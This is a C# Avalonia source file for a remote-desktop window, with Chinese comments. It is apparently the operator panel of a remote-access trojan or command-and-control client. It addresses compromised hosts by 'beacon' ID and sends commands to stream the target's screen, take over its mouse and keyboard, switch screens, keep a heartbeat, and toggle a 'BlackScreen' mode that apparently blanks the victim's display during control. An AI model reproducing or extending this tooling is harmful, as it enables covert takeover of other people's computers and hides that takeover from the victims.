using Avalonia;
using Avalonia.Controls;
using Avalonia.Controls.Shapes;
using Avalonia.Interactivity;
using Avalonia.Markup.Xaml;
using AVASClient.MessagePackLib;
using AVASClient.Services;
using StreamLibrary;
using StreamLibrary.UnsafeCodecs;
using StreamLibrary.src;
using System;
using System.Timers;
using System.IO;

namespace AVASClient;

public partial class Form_RemoteDesktop : Window
{
    //需要传入的参数
    //1.beacon的id -> string CID
    public string BID { get;set; }
    private const string DLLINFO = "RemoteDesktop";
    //public System.Drawing.Image GetImage { get; set; }
    //public object syncPicbox = new object();
    public bool ISOK { get; set; }                          //远程桌面是否开启,默认开启
    public bool MouseControlEnabled { get; set; } = false;  //鼠标控制是否启用
    public bool KeyboardControlEnabled { get; set; } = false; //键盘控制是否启用
    public bool BlackScreenEnabled { get; set; } = false;   //黑屏是否启用
    public IUnsafeCodec decoder = new UnsafeStreamCodec();//默认60帧率,可调整
	private System.Timers.Timer _heartbeatTimer;             // 心跳定时器


    public Form_RemoteDesktop(string _BID)
    {
        BID = _BID;
        InitializeComponent();
        
        // 强制初始化 NativeMethods 以触发静态构造函数
        try
        {
            Console.WriteLine("[Form_RemoteDesktop] Forcing NativeMethods initialization...");


        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Form_RemoteDesktop] Error initializing NativeMethods: {ex.Message}");
        }
    }
    //发送开始或停止命令
    public void SendStaue(bool _isok) {
        //使用布尔变量ISOK来判断是停止还是开始
        string type = _isok ? "Start" : "Stop";
        try
        {
            ClientMsgPack clientMsgPack = new ClientMsgPack();
            //设置插件类型，以便服务器分发
            clientMsgPack.ForcePathObject("DLLINFO").SetAsString(DLLINFO);
            //设置客户端CID，以便服务器找到对应的beacon
            clientMsgPack.ForcePathObject("BID").SetAsString(BID);
            //设置插件的具体命令
            clientMsgPack.ForcePathObject("Pac_ket").AsString = type;
            if (_isok)
            {
                clientMsgPack.ForcePathObject("Quality").AsInteger = 30;
                //msgpack.ForcePathObject("Screen").AsInteger = Convert.ToInt32(numericUpDown2.Value.ToString());
            }
            
            Settings.client?.SendFramed(clientMsgPack.Encode2Bytes());
        }
        catch (Exception ex)
        {
            LogService.Instance?.Error($"远程桌面窗口加载失败，错误信息：{ex.Message}", "Form_RemoteDesktop");
        }
    }

    //发送控制命令（鼠标/键盘控制）
    public void SendControlCommand(string controlType, bool enabled)
    {
        try
        {
            ClientMsgPack clientMsgPack = new ClientMsgPack();
            clientMsgPack.ForcePathObject("DLLINFO").SetAsString(DLLINFO);
            clientMsgPack.ForcePathObject("BID").SetAsString(BID);
            clientMsgPack.ForcePathObject("Pac_ket").AsString = controlType;
            clientMsgPack.ForcePathObject("Enabled").AsInteger = enabled ? 1 : 0;
            
            Settings.client?.SendFramed(clientMsgPack.Encode2Bytes());
        }
        catch (Exception ex)
        {
            LogService.Instance?.Error($"发送控制命令失败：{ex.Message}", "Form_RemoteDesktop");
        }
    }

    //发送屏幕ID切换命令
    public void SendScreenCommand(int screenId)
    {
        try
        {
            ClientMsgPack clientMsgPack = new ClientMsgPack();
            clientMsgPack.ForcePathObject("DLLINFO").SetAsString(DLLINFO);
            clientMsgPack.ForcePathObject("BID").SetAsString(BID);
            clientMsgPack.ForcePathObject("Pac_ket").AsString = "Screen";
            clientMsgPack.ForcePathObject("ScreenId").AsInteger = screenId;
            
            Settings.client?.SendFramed(clientMsgPack.Encode2Bytes());
        }
        catch (Exception ex)
        {
            LogService.Instance?.Error($"发送屏幕切换命令失败：{ex.Message}", "Form_RemoteDesktop");
        }
    }

    //发送黑屏开关命令
    public void SendBlackScreenCommand(bool enabled)
    {
        try
        {
            ClientMsgPack clientMsgPack = new ClientMsgPack();
            clientMsgPack.ForcePathObject("DLLINFO").SetAsString(DLLINFO);
            clientMsgPack.ForcePathObject("BID").SetAsString(BID);
            clientMsgPack.ForcePathObject("Pac_ket").AsString = "BlackScreen";
            clientMsgPack.ForcePathObject("Enabled").AsInteger = enabled ? 1 : 0;
            
            Settings.client?.SendFramed(clientMsgPack.Encode2Bytes());
        }
        catch (Exception ex)
        {
            LogService.Instance?.Error($"发送黑屏命令失败：{ex.Message}", "Form_RemoteDesktop");
        }
    }

	private void StartHeartbeat()
	{
		try
		{
			if (_heartbeatTimer == null)
			{
				_heartbeatTimer = new System.Timers.Timer(3000);
				_heartbeatTimer.AutoReset = true;
				_heartbeatTimer.Elapsed += HeartbeatTimerOnElapsed;
			}
			_heartbeatTimer.Start();
		}
		catch (Exception ex)
		{
			LogService.Instance?.Error($"心跳启动失败: {ex.Message}", "Form_RemoteDesktop");
		}
	}

	private void StopHeartbeat()
	{
		try
		{
			if (_heartbeatTimer != null)
			{
				_heartbeatTimer.Stop();
			}
		}
		catch { }
	}

	private void HeartbeatTimerOnElapsed(object? sender, ElapsedEventArgs e)
	{
		try
		{
			ClientMsgPack clientMsgPack = new ClientMsgPack();
			clientMsgPack.ForcePathObject("DLLINFO").SetAsString(DLLINFO);
			clientMsgPack.ForcePathObject("BID").SetAsString(BID);
			clientMsgPack.ForcePathObject("Pac_ket").AsString = "Heartbeat";
			Settings.client?.SendFramed(clientMsgPack.Encode2Bytes());
		}
		catch (Exception ex)
		{
			LogService.Instance?.Error($"心跳发送失败: {ex.Message}", "Form_RemoteDesktop");
		}
        // 不在计时器线程强制 GC
    }
    private void Window_Loaded(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
    {
        try
        {
            ISOK = true; 
            SendStaue(ISOK);
			StartHeartbeat();
        }
        catch(Exception ex)
        { 
            LogService.Instance?.Error($"远程桌面窗口加载失败，错误信息：{ex.Message}", "Form_RemoteDesktop");
        }
    }

    private void MouseControlButton_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
    {
        // 切换鼠标控制状态
        MouseControlEnabled = !MouseControlEnabled;
        SendControlCommand("MouseControl", MouseControlEnabled);
        
        // 更新按钮文字
        if (MouseControlText != null)
        {
            MouseControlText.Text = MouseControlEnabled ? "鼠标：开" : "鼠标：关";
        }
    }

    private void KeyboardControlButton_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
    {
        // 切换键盘控制状态
        KeyboardControlEnabled = !KeyboardControlEnabled;
        SendControlCommand("KeyboardControl", KeyboardControlEnabled);
        
        // 更新按钮文字
        if (KeyboardControlText != null)
        {
            KeyboardControlText.Text = KeyboardControlEnabled ? "键盘：开" : "键盘：关";
        }
    }

    private void ScreenIdButton_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
    {
        // 切换屏幕ID
        try
        {
            if (int.TryParse(ScreenIdTextBox?.Text, out int screenId))
            {
                SendScreenCommand(screenId);
                Console.WriteLine($"[Form_RemoteDesktop] 切换屏幕ID: {screenId}");
            }
            else
            {
                Console.WriteLine("[Form_RemoteDesktop] 无效的屏幕ID");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Form_RemoteDesktop] 切换屏幕ID失败: {ex.Message}");
        }
    }

    private void BlackScreenButton_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
    {
        // 切换黑屏状态
        BlackScreenEnabled = !BlackScreenEnabled;
        SendBlackScreenCommand(BlackScreenEnabled);
        
        // 更新按钮文字
        if (BlackScreenText != null)
        {
            BlackScreenText.Text = BlackScreenEnabled ? "黑屏：开" : "黑屏：关";
        }
    }

    // 鼠标移动事件
    private void VideoImage_PointerMoved(object? sender, Avalonia.Input.PointerEventArgs e)
    {
        if (!MouseControlEnabled) return;
        
        try
        {
            var position = e.GetPosition(VideoImage);
            var realPosition = CalculateRealPosition(position);
            SendMouseMove(realPosition.X, realPosition.Y);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Form_RemoteDesktop] 鼠标移动事件错误: {ex.Message}");
        }
    }

    // 鼠标按下事件
    private void VideoImage_PointerPressed(object? sender, Avalonia.Input.PointerPressedEventArgs e)
    {
        if (!MouseControlEnabled) return;
        
        try
        {
            var position = e.GetPosition(VideoImage);
            var realPosition = CalculateRealPosition(position);
            var button = GetMouseButtonFromPointerPressed(e);
            Console.WriteLine($"[Form_RemoteDesktop] 鼠标按下: 按钮={button}, 位置=({realPosition.X},{realPosition.Y})");
            SendMouseEvent(realPosition.X, realPosition.Y, button, 1); // 1 = 按下
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Form_RemoteDesktop] 鼠标按下事件错误: {ex.Message}");
        }
    }

    // 鼠标释放事件
    private void VideoImage_PointerReleased(object? sender, Avalonia.Input.PointerReleasedEventArgs e)
    {
        if (!MouseControlEnabled) return;
        
        try
        {
            var position = e.GetPosition(VideoImage);
            var realPosition = CalculateRealPosition(position);
            var button = GetMouseButtonFromPointerReleased(e);
            Console.WriteLine($"[Form_RemoteDesktop] 鼠标释放: 按钮={button}, 位置=({realPosition.X},{realPosition.Y})");
            SendMouseEvent(realPosition.X, realPosition.Y, button, 2); // 2 = 释放
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Form_RemoteDesktop] 鼠标释放事件错误: {ex.Message}");
        }
    }

    // 鼠标滚轮事件
    private void VideoImage_PointerWheelChanged(object? sender, Avalonia.Input.PointerWheelEventArgs e)
    {
        if (!MouseControlEnabled) return;
        
        try
        {
            var position = e.GetPosition(VideoImage);
            var realPosition = CalculateRealPosition(position);
            
            // 获取滚轮方向
            int button = 1; // 默认向上
            if (e.Delta.Y < 0) // 向下滚动
            {
                button = 2;
            }
            
            Console.WriteLine($"[Form_RemoteDesktop] 滚轮事件: 方向={button}, 位置=({realPosition.X},{realPosition.Y}), Delta={e.Delta.Y}");
            SendMouseEvent(realPosition.X, realPosition.Y, button, 3); // 3 = 滚轮
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Form_RemoteDesktop] 滚轮事件错误: {ex.Message}");
        }
    }

    // 计算真实屏幕坐标
    private System.Drawing.Point CalculateRealPosition(Avalonia.Point clientPosition)
    {
        try
        {
            // 获取图像的实际显示尺寸
            int imageWidth = 0; // 默认屏幕宽度
            int imageHeight = 0; // 默认屏幕高度
            
            // 尝试从图像源获取实际尺寸
            if (VideoImage.Source is Avalonia.Media.Imaging.Bitmap bitmap)
            {
                imageWidth = bitmap.PixelSize.Width;
                imageHeight = bitmap.PixelSize.Height;
            }
            else if (VideoImage.Source is Avalonia.Media.Imaging.WriteableBitmap writeableBitmap)
            {
                imageWidth = writeableBitmap.PixelSize.Width;
                imageHeight = writeableBitmap.PixelSize.Height;
            }
            
            // 获取控件的实际显示尺寸
            var controlWidth = VideoImage.Bounds.Width;
            var controlHeight = VideoImage.Bounds.Height;
            
            if (imageWidth <= 0 || imageHeight <= 0 || controlWidth <= 0 || controlHeight <= 0)
            {
                Console.WriteLine($"[Form_RemoteDesktop] 无效的尺寸: Image({imageWidth}x{imageHeight}), Control({controlWidth}x{controlHeight})");
                return new System.Drawing.Point((int)clientPosition.X, (int)clientPosition.Y);
            }
            
            // 计算缩放比例
            var scaleX = (double)imageWidth / controlWidth;
            var scaleY = (double)imageHeight / controlHeight;
            
            // 计算真实坐标
            var realX = (int)(clientPosition.X * scaleX);
            var realY = (int)(clientPosition.Y * scaleY);
            
            // 确保坐标在有效范围内
            realX = Math.Max(0, Math.Min(realX, imageWidth - 1));
            realY = Math.Max(0, Math.Min(realY, imageHeight - 1));
            
            Console.WriteLine($"[Form_RemoteDesktop] 坐标转换: 客户端({clientPosition.X:F1},{clientPosition.Y:F1}) -> 真实({realX},{realY}) [缩放: {scaleX:F2}x{scaleY:F2}]");
            
            return new System.Drawing.Point(realX, realY);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Form_RemoteDesktop] 坐标计算错误: {ex.Message}");
            return new System.Drawing.Point((int)clientPosition.X, (int)clientPosition.Y);
        }
    }

    // 从按下事件获取鼠标按钮
    private int GetMouseButtonFromPointerPressed(Avalonia.Input.PointerPressedEventArgs e)
    {
        try
        {
            var point = e.GetCurrentPoint(VideoImage);
            var properties = point.Properties;
            
            if (properties.IsLeftButtonPressed)
            {
                Console.WriteLine("[Form_RemoteDesktop] 检测到左键按下");
                return 1; // 左键
            }
            else if (properties.IsRightButtonPressed)
            {
                Console.WriteLine("[Form_RemoteDesktop] 检测到右键按下");
                return 2; // 右键
            }
            else if (properties.IsMiddleButtonPressed)
            {
                Console.WriteLine("[Form_RemoteDesktop] 检测到中键按下");
                return 4; // 中键
            }
            
            // 如果无法确定按钮，尝试从事件参数获取
            // 注意：Avalonia 的 KeyModifiers 可能不包含鼠标按钮信息
            // 这里暂时注释掉，主要依赖 Properties 检测
            
            Console.WriteLine("[Form_RemoteDesktop] 默认使用左键");
            return 1; // 默认左键
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Form_RemoteDesktop] 获取鼠标按钮错误: {ex.Message}");
            return 1; // 默认左键
        }
    }

    // 从释放事件获取鼠标按钮
    private int GetMouseButtonFromPointerReleased(Avalonia.Input.PointerReleasedEventArgs e)
    {
        try
        {
            var point = e.GetCurrentPoint(VideoImage);
            var properties = point.Properties;
            
            // 在释放事件中，我们需要检查哪个按钮被释放了
            // 由于按钮状态可能已经改变，我们需要从事件本身获取信息
            
            if (e.InitialPressMouseButton == Avalonia.Input.MouseButton.Left)
            {
                Console.WriteLine("[Form_RemoteDesktop] 检测到左键释放");
                return 1; // 左键
            }
            else if (e.InitialPressMouseButton == Avalonia.Input.MouseButton.Right)
            {
                Console.WriteLine("[Form_RemoteDesktop] 检测到右键释放");
                return 2; // 右键
            }
            else if (e.InitialPressMouseButton == Avalonia.Input.MouseButton.Middle)
            {
                Console.WriteLine("[Form_RemoteDesktop] 检测到中键释放");
                return 4; // 中键
            }
            
            Console.WriteLine("[Form_RemoteDesktop] 默认使用左键释放");
            return 1; // 默认左键
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Form_RemoteDesktop] 获取鼠标按钮错误: {ex.Message}");
            return 1; // 默认左键
        }
    }

    // 发送鼠标移动命令
    private void SendMouseMove(int x, int y)
    {
        try
        {
            ClientMsgPack clientMsgPack = new ClientMsgPack();
            clientMsgPack.ForcePathObject("DLLINFO").SetAsString(DLLINFO);
            clientMsgPack.ForcePathObject("BID").SetAsString(BID);
            clientMsgPack.ForcePathObject("Pac_ket").AsString = "MouseMove";
            clientMsgPack.ForcePathObject("X").AsInteger = x;
            clientMsgPack.ForcePathObject("Y").AsInteger = y;
            
            Settings.client?.SendFramed(clientMsgPack.Encode2Bytes());
        }
        catch (Exception ex)
        {
            LogService.Instance?.Error($"发送鼠标移动命令失败：{ex.Message}", "Form_RemoteDesktop");
        }
    }

    // 发送鼠标事件命令
    private void SendMouseEvent(int x, int y, int button, int action)
    {
        try
        {
            ClientMsgPack clientMsgPack = new ClientMsgPack();
            clientMsgPack.ForcePathObject("DLLINFO").SetAsString(DLLINFO);
            clientMsgPack.ForcePathObject("BID").SetAsString(BID);
            clientMsgPack.ForcePathObject("Pac_ket").AsString = "MouseEvent";
            clientMsgPack.ForcePathObject("X").AsInteger = x;
            clientMsgPack.ForcePathObject("Y").AsInteger = y;
            clientMsgPack.ForcePathObject("Button").AsInteger = button;
            clientMsgPack.ForcePathObject("Action").AsInteger = action;
            
            Settings.client?.SendFramed(clientMsgPack.Encode2Bytes());
        }
        catch (Exception ex)
        {
            LogService.Instance?.Error($"发送鼠标事件命令失败：{ex.Message}", "Form_RemoteDesktop");
        }
    }

    private void Window_Closed(object? sender, System.EventArgs e)
    {
        SendStaue(false);//关闭窗口时发送停止命令
        StopHeartbeat();
        if (_heartbeatTimer != null)
        {
            _heartbeatTimer.Elapsed -= HeartbeatTimerOnElapsed;
            _heartbeatTimer.Dispose();
            _heartbeatTimer = null;
        }

        // 释放 VideoImage.Source（Avalonia Bitmap）
        var oldBitmap = VideoImage.Source as Avalonia.Media.Imaging.Bitmap;
        oldBitmap?.Dispose();
        VideoImage.Source = null;

        // 释放解码器
        if (decoder is IDisposable d)
            d.Dispose();
        decoder = null;
    }
}